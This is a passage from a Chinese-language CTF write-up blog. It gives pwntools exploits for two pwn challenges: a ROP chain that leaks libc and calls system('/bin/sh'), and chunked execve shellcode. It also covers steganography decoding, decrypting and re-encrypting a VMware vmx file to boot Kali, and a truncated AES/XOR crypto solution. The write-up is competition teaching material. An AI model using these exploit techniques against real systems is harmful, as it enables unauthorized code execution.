class=\"hljs-built_in\">string</span>):\n\tj = <span class=\"hljs-number\">0</span>\n\t<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">8</span>):\n\t\tp.recvuntil(<span class=\"hljs-string\">\"Which position you want to modify?\\n\"</span>)\n\t\tpayload = p32(num)\n\t\tp.<span class=\"hljs-built_in\">send</span>(payload)\n\t\tp.recvuntil(<span class=\"hljs-string\">\"What content you want to write in?\\n\"</span>)\n\t\tpayload = <span class=\"hljs-built_in\">string</span>[j]\n\t\tp.<span class=\"hljs-built_in\">send</span>(payload)\n\t\tnum += <span class=\"hljs-number\">1</span>\n\t\tj += <span class=\"hljs-number\">1</span>\n\t\t\npop_rdi = <span class=\"hljs-number\">0x0000000000400b13</span>\nread_got = elf.got[<span class=\"hljs-string\">\"read\"</span>] <span class=\"hljs-meta\"># 0x602038</span>\nalarm_got = elf.got[<span class=\"hljs-string\">\"alarm\"</span>] <span class=\"hljs-meta\"># 0x602030</span>\nstart = <span class=\"hljs-number\">0x4005D0</span>\nputs_plt = elf.plt[<span class=\"hljs-string\">\"puts\"</span>] <span class=\"hljs-meta\"># 0x40054c</span>\n\n<span class=\"hljs-meta\">#gdb.attach(p,<span class=\"hljs-string\">\"b *0x400AAC\"</span>)</span>\n\np.recvuntil(<span class=\"hljs-string\">\"Please set arrary number:\"</span>)\np.<span class=\"hljs-built_in\">send</span>(<span class=\"hljs-string\">\"over\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"How many numbers do you have?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">10</span>))\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">9</span>):\n\tdata = p.recv()\n\tp.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0</span>))\np.recv() \np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0x20633372</span>))\n\np.recvuntil(<span class=\"hljs-string\">\"How many positions you want to modify?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">32</span>))\n\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#pop_rdi</span>\nchange_addr(<span class=\"hljs-number\">0x38</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x38\\x20\\x60\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#read_got</span>\nchange_addr(<span class=\"hljs-number\">0x40</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x4c\\x05\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#puts_plt</span>\nchange_addr(<span class=\"hljs-number\">0x48</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\xd0\\x05\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#start</span>\nchange_addr(<span class=\"hljs-number\">0x50</span>,<span class=\"hljs-built_in\">string</span>)\np.recvuntil(<span class=\"hljs-string\">\"!\"</span>)\ndata = p.recvuntil(<span class=\"hljs-string\">\"\\n\"</span>,drop=<span class=\"hljs-literal\">True</span>)\ndata = data.ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">\"\\x00\"</span>)\ndata = u64(data)\nlibc_base = data - <span class=\"hljs-number\">0x0f7250</span>\nprint <span class=\"hljs-string\">\"base : \"</span>+<span class=\"hljs-built_in\">hex</span>(libc_base)\nbinsh_addr = libc_base + <span class=\"hljs-number\">0x18cd57</span>\nsystem_addr = libc_base + <span class=\"hljs-number\">0x045390</span>\nprint <span class=\"hljs-string\">\"system_addr :\"</span> +<span class=\"hljs-built_in\">hex</span>(system_addr)\nprint <span class=\"hljs-string\">\"binsh_addr :\"</span> +<span class=\"hljs-built_in\">hex</span>(binsh_addr)\n\n<span class=\"hljs-meta\">#gdb.attach(p,<span class=\"hljs-string\">\"b *0x400AAC\"</span>)</span>\n\np.recvuntil(<span class=\"hljs-string\">\"Please set arrary number:\"</span>)\np.<span class=\"hljs-built_in\">send</span>(<span class=\"hljs-string\">\"over\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"How many numbers do you have?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">10</span>))\n<span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> range(<span class=\"hljs-number\">9</span>):\n\tdata = p.recv()\n\tp.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0</span>))\np.recv() \np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">0x20633372</span>))\np.recvuntil(<span class=\"hljs-string\">\"How many positions you want to modify?\\n\"</span>)\np.<span class=\"hljs-built_in\">send</span>(p32(<span class=\"hljs-number\">24</span>))\n<span class=\"hljs-built_in\">string</span> = <span class=\"hljs-string\">\"\\x13\\x0b\\x40\\x00\\x00\\x00\\x00\\x00\"</span> <span class=\"hljs-meta\">#pop_rdi</span>\nchange_addr(<span class=\"hljs-number\">0x38</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = pack(<span class=\"hljs-string\">'L'</span>,binsh_addr)\nchange_addr(<span class=\"hljs-number\">0x40</span>,<span class=\"hljs-built_in\">string</span>)\n<span class=\"hljs-built_in\">string</span> = pack(<span class=\"hljs-string\">'L'</span>,system_addr)\nchange_addr(<span class=\"hljs-number\">0x48</span>,<span class=\"hljs-built_in\">string</span>)\n\np.interactive()</code></pre></p>\n<h4 id=\"0x01-treasure\"><a href=\"#0x01-treasure\" class=\"headerlink\" title=\"0x01 treasure\"></a>0x01 treasure</h4><p>这个题目是赛后队友才做出来的，有点可惜。思路是劫持程序流。提前布局，R15和R14寄存器是没有用到的，每次输入只能输入9个字符长度，所以不能直接写shellcode，第一次写入控制那个9个长度的变量，使程序不跳到9，长度就可变。<br>exp如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *\n<span class=\"hljs-keyword\">from</span> struct <span class=\"hljs-keyword\">import</span> pack\n\ncontext(<span class=\"hljs-built_in\">os</span>=<span class=\"hljs-string\">'linux'</span>,arch=<span class=\"hljs-string\">'amd64'</span>,aslr = <span class=\"hljs-string\">'False'</span>)\n<span class=\"hljs-keyword\">local</span> = <span class=\"hljs-number\">1</span>\nlog_level=<span class=\"hljs-string\">'debug'</span>\n\n<span class=\"hljs-keyword\">if</span> <span class=\"hljs-name\">local</span>:\n\tp = process(<span class=\"hljs-string\">\"./treasure\"</span>)#,env=&#123;<span class=\"hljs-string\">'LD_PRELOAD'</span>:<span class=\"hljs-string\">'./libc_x64.so.6'</span>&#125;)\n\telf = ELF(<span class=\"hljs-string\">\"./treasure\"</span>)\n\t#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)\n<span class=\"hljs-name\">else</span>:\n\tp = remote(<span class=\"hljs-string\">'58.20.46.148'</span>,<span class=\"hljs-number\">35272</span>)\n\telf = ELF(<span class=\"hljs-string\">\"./overInt\"</span>)\n\t#libc = ELF(<span class=\"hljs-string\">'./libc_x64.so.6'</span>)\n\ndef mycode(shellcode):\n\tp.recvuntil(<span class=\"hljs-string\">\"(enter 'n' to quit) :\"</span>)\n\tp.sendline(<span class=\"hljs-string\">\"\\x90\"</span>)\n\tp.recvuntil(<span class=\"hljs-string\">\"start!!!!\"</span>)\n\tp.send(shellcode)\n\ntest = <span class=\"hljs-string\">\"abcdefghi\"</span>\n\n#gdb.attach(p,<span class=\"hljs-string\">\"b *0x4009BA\"</span> ) #b *<span class=\"hljs-number\">0x400AAE</span><span class=\"hljs-string\">\")\n\ntrea_addr = 0x4009BA\n\nshellcode = asm(\"</span>mov r15,rdx;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*6)\nmycode(shellcode)\nshellcode = asm(\"</span>mov ebx,<span class=\"hljs-number\">0x400A6c</span>;mov r14,rbx;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*1)\nmycode(shellcode)\n\nshellcode = asm(\"</span>mov ebx,<span class=\"hljs-number\">30</span>;<span class=\"hljs-string\">\"+\"</span>nop;<span class=\"hljs-string\">\"*4)\nmycode(shellcode)\n\nshellcode = asm(\"</span>mov rax,r15;mov rsi,rbx;jmp r14;<span class=\"hljs-string\">\")\nmycode(shellcode)\n\nshellcode = \"</span>\\x6a\\x42\\x58\\xfe\\xc4\\x48\\x99\\x52\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5e\\x49\\x89\\xd0\\x49\\x89\\xd2\\x0f\\x05<span class=\"hljs-string\">\"\np.sendline(shellcode)\n\"</span><span class=\"hljs-string\">\"\"</span>\np.recvuntil(<span class=\"hljs-string\">\"(enter 'n' to quit) :\"</span>)\np.sendline(<span class=\"hljs-string\">\"\\x90\"</span>)\np.recvuntil(<span class=\"hljs-string\">\"start!!!!\"</span>)\np.send(test)\n<span class=\"hljs-string\">\"\"</span><span class=\"hljs-string\">\"\np.interactive()</span></code></pre></p>\n<h3 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h3><h4 id=\"0x02-traffic-light\"><a href=\"#0x02-traffic-light\" class=\"headerlink\" title=\"0x02 traffic light\"></a>0x02 traffic light</h4><p>题目给的GIF图片有1168帧，把每一帧都提取出来，红绿灯表示01，黄灯表示间隔，得到二进制再转城可见字符就可以得到flag</p>\n<h4 id=\"0x03-GreatWall\"><a href=\"#0x03-GreatWall\" class=\"headerlink\" title=\"0x03 GreatWall\"></a>0x03 GreatWall</h4><p>lsb隐写提出一张jpg，+是分隔符，长短杠分别是二进制的1和0，然后转成字符<br><pre><code class=\"hljs undefined\">#encoding:utf-<span class=\"hljs-number\">8</span>\nlist1 = [<span class=\"hljs-number\">1010011</span>,<span class=\"hljs-number\">1110100,110011</span>,<span class=\"hljs-number\">1100111,110100</span>,<span class=\"hljs-number\">1101110,110000</span>,<span class=\"hljs-number\">1100111</span>,<span class=\"hljs-number\">1110010</span>,<span class=\"hljs-number\">110100</span>,<span class=\"hljs-number\">1110000</span>,<span class=\"hljs-number\">1101000</span>,<span class=\"hljs-number\">1111001</span>,<span class=\"hljs-number\">1011111,110001</span>,<span class=\"hljs-number\">1110011</span>,<span class=\"hljs-number\">1011111,110001</span>,<span class=\"hljs-number\">1101110,1110100</span>,<span class=\"hljs-number\">110011</span>,<span class=\"hljs-number\">1110010</span>,<span class=\"hljs-number\">110011</span>,<span class=\"hljs-number\">1110011</span>,<span class=\"hljs-number\">1110100,110001</span>,<span class=\"hljs-number\">1101110,1100111</span>]\nj = ''\nresult =''\nfor i in range(len(list1)):\n    tmp = int(str(list1[i]),<span class=\"hljs-number\">2</span>)\n    result += chr(tmp)\n    print result</code></pre></p>\n<h4 id=\"0x04-hack1t\"><a href=\"#0x04-hack1t\" class=\"headerlink\" title=\"0x04 hack1t\"></a>0x04 hack1t</h4><p>这道题的思路类似于进pe系统读windows的文件，通过加载另外一个系统读取文件。首先这个虚拟机有密码，题目已经给出了，但是没有给出修改配置的密码，也就是说我们只能打开，不能修改任何东西，配置文件xxx.vmx也是被加了密的，百度到一个github项目可以破解vmx配置文件的破解<br><a href=\"https://github.com/RF3/VMwareVMX\" target=\"_blank\" rel=\"noopener\">GitHub项目</a><br>但是这个项目的代码有一点瑕疵，直接解密会触发一个错误<br><img src=\"/img/2018-12-03/1.png\" srcset=\"/img/static/loading.gif\" alt=\"1\"><br><pre><code class=\"hljs undefined\">root<span class=\"hljs-variable\">@Ubuntu</span><span class=\"hljs-symbol\">:~/Desktop/VMwareVMX-master</span><span class=\"hljs-comment\"># python3 main.py \"Ubuntu 64-bit.vmx\" </span>\n<span class=\"hljs-symbol\">Password:</span>\n<span class=\"hljs-symbol\">Error:</span> File Ubuntu <span class=\"hljs-number\">64</span>-bit.vmx is <span class=\"hljs-keyword\">not</span> a valid VMX file</code></pre></p>\n<p>原因是代码中给的<code>displayname</code>是小写，但是判断却是大写<code>displayName</code>,修改成小写即可<br><img src=\"/img/2018-12-03/2.png\" srcset=\"/img/static/loading.gif\" alt=\"2\"><br>然后就可以得到解密后的vmx配置信息<br><pre><code class=\"hljs undefined\">root@Ubuntu:~/Desktop/VMwareVMX-master<span class=\"hljs-comment\"># python3 main.py \"Ubuntu 64-bit.vmx\" </span>\nPassword:\n<span class=\"hljs-attr\">guestos</span> = <span class=\"hljs-string\">\"ubuntu-64\"</span>\nvirtualhw.<span class=\"hljs-attr\">version</span> = <span class=\"hljs-string\">\"13\"</span>\nconfig.<span class=\"hljs-attr\">version</span> = <span class=\"hljs-string\">\"8\"</span>\n<span class=\"hljs-attr\">numvcpus</span> = <span class=\"hljs-string\">\"2\"</span>\ncpuid.<span class=\"hljs-attr\">coresPerSocket</span> = <span class=\"hljs-string\">\"1\"</span>\n<span class=\"hljs-attr\">memsize</span> = <span class=\"hljs-string\">\"2048\"</span>\npciBridge0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge4.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge4.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge4.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge5.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge5.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge5.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge6.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge6.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge6.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\npciBridge7.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npciBridge7.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"pcieRootPort\"</span>\npciBridge7.<span class=\"hljs-attr\">functions</span> = <span class=\"hljs-string\">\"8\"</span>\nvmci0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nmks.<span class=\"hljs-attr\">enable3d</span> = <span class=\"hljs-string\">\"true\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">deviceType</span> = <span class=\"hljs-string\">\"disk\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">fileName</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit-disk1.vmdk\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">mode</span> = <span class=\"hljs-string\">\"persistent\"</span>\nscsi0.<span class=\"hljs-attr\">virtualDev</span> = <span class=\"hljs-string\">\"lsilogic\"</span>\nscsi0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nsata0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nvmci0.<span class=\"hljs-attr\">unrestricted</span> = <span class=\"hljs-string\">\"false\"</span>\nvcpu.<span class=\"hljs-attr\">hotadd</span> = <span class=\"hljs-string\">\"true\"</span>\nmem.<span class=\"hljs-attr\">hotadd</span> = <span class=\"hljs-string\">\"true\"</span>\npowerType.<span class=\"hljs-attr\">powerOff</span> = <span class=\"hljs-string\">\"soft\"</span>\npowerType.<span class=\"hljs-attr\">reset</span> = <span class=\"hljs-string\">\"soft\"</span>\npowerType.<span class=\"hljs-attr\">suspend</span> = <span class=\"hljs-string\">\"soft\"</span>\ntoolscripts.<span class=\"hljs-attr\">afterpoweron</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">afterresume</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">beforepoweroff</span> = <span class=\"hljs-string\">\"true\"</span>\ntoolscripts.<span class=\"hljs-attr\">beforesuspend</span> = <span class=\"hljs-string\">\"true\"</span>\ntools.<span class=\"hljs-attr\">syncTime</span> = <span class=\"hljs-string\">\"false\"</span>\n<span class=\"hljs-attr\">nvram</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit-file1.nvram\"</span>\nvirtualHW.<span class=\"hljs-attr\">productCompatibility</span> = <span class=\"hljs-string\">\"hosted\"</span>\n<span class=\"hljs-attr\">extendedConfigFile</span> = <span class=\"hljs-string\">\"Ubuntu 64-bit.vmxf\"</span>\n<span class=\"hljs-attr\">dataFileKey</span> = <span class=\"hljs-string\">\"type=key:cipher=AES-256:key=NHhuUIeIg1lhhNi7CvHXZysR+lrMxsNhJl7DO0SIuZ4%3d\"</span>\n<span class=\"hljs-attr\">cryptoState</span> = <span class=\"hljs-string\">\"encrypted\"</span>\nisolation.tools.copy.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nisolation.tools.dnd.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nisolation.tools.paste.<span class=\"hljs-attr\">disable</span> = <span class=\"hljs-string\">\"TRUE\"</span>\npolicy.vm.<span class=\"hljs-attr\">mvmtid</span> = <span class=\"hljs-string\">\"52 b5 65 b9 89 e2 54 bf-e2 ee e6 99 1f 9d 2d 29\"</span>\nrollingTier0.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier0.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"86400\"</span>\nrollingTier0.<span class=\"hljs-attr\">maximum</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier0.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier0.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nrollingTier1.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"2\"</span>\nrollingTier1.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"604800\"</span>\nrollingTier1.<span class=\"hljs-attr\">baseTier</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier1.<span class=\"hljs-attr\">baseTierInterval</span> = <span class=\"hljs-string\">\"7\"</span>\nrollingTier1.<span class=\"hljs-attr\">maximum</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier1.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier1.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nrollingTier2.<span class=\"hljs-attr\">uid</span> = <span class=\"hljs-string\">\"3\"</span>\nrollingTier2.<span class=\"hljs-attr\">interval</span> = <span class=\"hljs-string\">\"2419200\"</span>\nrollingTier2.<span class=\"hljs-attr\">baseTier</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier2.<span class=\"hljs-attr\">baseTierInterval</span> = <span class=\"hljs-string\">\"28\"</span>\nrollingTier2.<span class=\"hljs-attr\">maximum</span> = <span class=\"hljs-string\">\"1\"</span>\nrollingTier2.<span class=\"hljs-attr\">clientFlags</span> = <span class=\"hljs-string\">\"8\"</span>\nrollingTier2.<span class=\"hljs-attr\">displayName</span> = <span class=\"hljs-string\">\"自动保护快照\"</span>\nsnapshot.<span class=\"hljs-attr\">numRollingTiers</span> = <span class=\"hljs-string\">\"3\"</span>\nfloppy0.<span class=\"hljs-attr\">present</span> = <span class=\"hljs-string\">\"FALSE\"</span>\nuuid.<span class=\"hljs-attr\">bios</span> = <span class=\"hljs-string\">\"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"</span>\nuuid.<span class=\"hljs-attr\">location</span> = <span class=\"hljs-string\">\"56 4d 06 45 68 99 38 62-e8 b8 d6 23 3b 97 07 eb\"</span>\nmigrate.<span class=\"hljs-attr\">hostlog</span> = <span class=\"hljs-string\">\".\\Ubuntu 64-bit-0dae80fb.hlog\"</span>\nscsi0:<span class=\"hljs-number\">0</span>.<span class=\"hljs-attr\">redo</span> = <span class=\"hljs-string\">\"\"</span>\npciBridge0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"17\"</span>\npciBridge4.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"21\"</span>\npciBridge5.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"22\"</span>\npciBridge6.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"23\"</span>\npciBridge7.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"24\"</span>\nscsi0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"16\"</span>\nvmci0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"32\"</span>\nsata0.<span class=\"hljs-attr\">pciSlotNumber</span> = <span class=\"hljs-string\">\"33\"</span>\nvmci0.<span class=\"hljs-attr\">id</span> = <span class=\"hljs-string\">\"-119750326\"</span>\nmonitor.<span class=\"hljs-attr\">phys_bits_used</span> = <span class=\"hljs-string\">\"43\"</span>\nvmotion.<span class=\"hljs-attr\">checkpointFBSize</span> = <span class=\"hljs-string\">\"4194304\"</span>\nvmotion.<span class=\"hljs-attr\">checkpointSVGAPrimarySize</span> = <span class=\"hljs-string\">\"134217728\"</span>\n<span class=\"hljs-attr\">cleanShutdown</span> = <span class=\"hljs-string\">\"TRUE\"</span>\n<span class=\"hljs-attr\">softPowerOff</span> = <span class=\"hljs-string\">\"FALSE\"</span>\nsvga.<span class=\"hljs-attr\">guestBackedPrimaryAware</span> = <span class=\"hljs-string\">\"TRUE\"</span>\nrollingTier0.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nrollingTier1.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nrollingTier2.<span class=\"hljs-attr\">timeSincelast</span> = <span class=\"hljs-string\">\"203\"</span>\nsvga.<span class=\"hljs-attr\">vramSize</span> = <span class=\"hljs-string\">\"134217728\"</span></code></pre></p>\n<p>用一个正常的虚拟机添加一个CD/DVD，指向一个kali的iso，发现配置文件会多了下面三行代码<br><pre><code class=\"hljs undefined\">sata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.deviceType</span> = <span class=\"hljs-string\">\"cdrom-image\"</span>\nsata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.fileName</span> = <span class=\"hljs-string\">\"D:\\kali\\kali-linux-2018.2-amd64.iso\"</span>\nsata0:<span class=\"hljs-number\">0</span><span class=\"hljs-selector-class\">.present</span> = <span class=\"hljs-string\">\"TRUE\"</span></code></pre></p>\n<p>加到上面的代码上去重新加密一下<br><pre><code class=\"hljs undefined\">root<span class=\"hljs-variable\">@Ubuntu</span><span class=\"hljs-symbol\">:~/Desktop/VMwareVMX-master</span><span class=\"hljs-comment\"># python3 main.py -e -D \"Ubuntu 64-bit\" -p bibinb ubuntu.vmx result.vmx</span></code></pre></p>\n<p><code>-D</code>指定虚拟机的名字，<code>ubuntu.vmx</code>待加密的文件，<code>result.vmx</code>加密后的结果，再用result.vmx替换掉原来的配置，打开虚拟机就可以看到多了CD/DVD<br><img src=\"/img/2018-12-03/3.png\" srcset=\"/img/static/loading.gif\" alt=\"3\"><br>开机按esc进BIOS选CD/DVD启动<br><img src=\"/img/2018-12-03/4.png\" srcset=\"/img/static/loading.gif\" alt=\"4\"><br>选第一个<br><img src=\"/img/2018-12-03/5.png\" srcset=\"/img/static/loading.gif\" alt=\"5\"><br>进到kali里打开文件系统<br><img src=\"/img/2018-12-03/6.jpg\" srcset=\"/img/static/loading.gif\" alt=\"6\"><br>find一下<br><img src=\"/img/2018-12-03/7.png\" srcset=\"/img/static/loading.gif\" alt=\"7\"><br>把4个部分凑一起打开就getflag<br><img src=\"/img/2018-12-03/8.png\" srcset=\"/img/static/loading.gif\" alt=\"8\"></p>\n<h4 id=\"0x05-What’s-this\"><a href=\"#0x05-What’s-this\" class=\"headerlink\" title=\"0x05 What’s_this\"></a>0x05 What’s_this</h4><p><a href=\"https://delcoding.github.io/2018/12/pcb-writeup/\" target=\"_blank\" rel=\"noopener\">文件删了复现不了了，只能看大佬的博客了</a></p>\n<h3 id=\"CRYPTO\"><a href=\"#CRYPTO\" class=\"headerlink\" title=\"CRYPTO\"></a>CRYPTO</h3><h4 id=\"0x04-easy-crypto\"><a href=\"#0x04-easy-crypto\" class=\"headerlink\" title=\"0x04 easy crypto\"></a>0x04 easy crypto</h4><p>本质就是异或，逆操作一遍就可以了<br>payloa如下：<br><pre><code class=\"hljs undefined\"><span class=\"hljs-comment\">#!usr/bin/python </span>\n<span class=\"hljs-comment\">#_*_ coding=UTF-8 _*_</span>\n\nfrom Crypto.Cipher import AES\nfrom binascii import b2a_hex, a2b_hex\nfrom Crypto import Random\nimport sys\n<span class=\"hljs-comment\">#from FLAG import flag</span>\n\n<span class=\"hljs-class\"><span class=\"hljs-keyword\">class</span> <span class=\"hljs-title\">aesdemo</span>:</span>\n\t<span class=\"hljs-comment\">#aes = AES.new(key,mode)</span>\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">__init__</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,key)</span></span>:\n\t\t<span class=\"hljs-keyword\">self</span>.key = key\n\t\t<span class=\"hljs-comment\">#self.BS=BS</span>\n\t\n       \n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">pad</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,msg)</span></span>:\n\t\t<span class=\"hljs-comment\">#BS = AES.block_size </span>\n\t\t<span class=\"hljs-comment\"># aes数据分组长度为128 bit</span>\n\t\tbyte = <span class=\"hljs-number\">16</span> - len(msg) % <span class=\"hljs-number\">16</span>\n\t\t<span class=\"hljs-keyword\">return</span> msg + chr(byte) * byte\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">unpad</span><span class=\"hljs-params\">(msg)</span></span>:\n\t\t<span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> <span class=\"hljs-symbol\">msg:</span>\n\t\t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">''</span>\n\t\t<span class=\"hljs-keyword\">return</span> msg[<span class=\"hljs-symbol\">:-ord</span>(msg[-<span class=\"hljs-number\">1</span>])]\t\t\n    \n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">xor</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,a, b)</span></span>:\n    \t\t<span class=\"hljs-comment\">#assert len(a) == len(b)</span>\n    \t\t<span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">''</span>.join([chr(ord(ai)^ord(bi)) <span class=\"hljs-keyword\">for</span> ai, bi <span class=\"hljs-keyword\">in</span> zip(a,b)])\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">split_by</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>,data,step)</span></span>:\n        \t<span class=\"hljs-keyword\">return</span> [data[i : i+step] <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> xrange(<span class=\"hljs-number\">0</span>, len(data), step)]\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">encrypt</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>, plaintext)</span></span>:\n        <span class=\"hljs-comment\"># 生成随机初始向量IV</span>\n\t\tiv = Random.new().read(<span class=\"hljs-number\">16</span>)\n\t\tprint <span class=\"hljs-string\">\"iv is\"</span>,iv.encode(<span class=\"hljs-string\">'hex'</span>)\n\t\taes = AES.new(<span class=\"hljs-keyword\">self</span>.key,AES.MODE_CBC,iv)\n\t\tprev_pt = iv\n\t\tprev_ct = iv\n\t\tct=<span class=\"hljs-string\">\"\"</span>\n\n\t\tmsg=<span class=\"hljs-keyword\">self</span>.pad(plaintext)\n\t\t<span class=\"hljs-keyword\">for</span> block <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">self</span>.split_by(msg, <span class=\"hljs-number\">16</span>):\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(block, prev_pt)\n\t\t\tct_block = aes.encrypt(ct_block)\n\t\t\tct_block = <span class=\"hljs-keyword\">self</span>.xor(ct_block, prev_ct)\n\t\t\tct += ct_block\n\t\t\t\n\t\t<span class=\"hljs-keyword\">return</span> b2a_hex(iv + ct)\n\n\t<span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">decrypt</span><span class=\"hljs-params\">(<span class=\"hljs-keyword\">self</span>, ciphertext,iv)</span></span>:\n        <span class=\"hljs-comment\"># 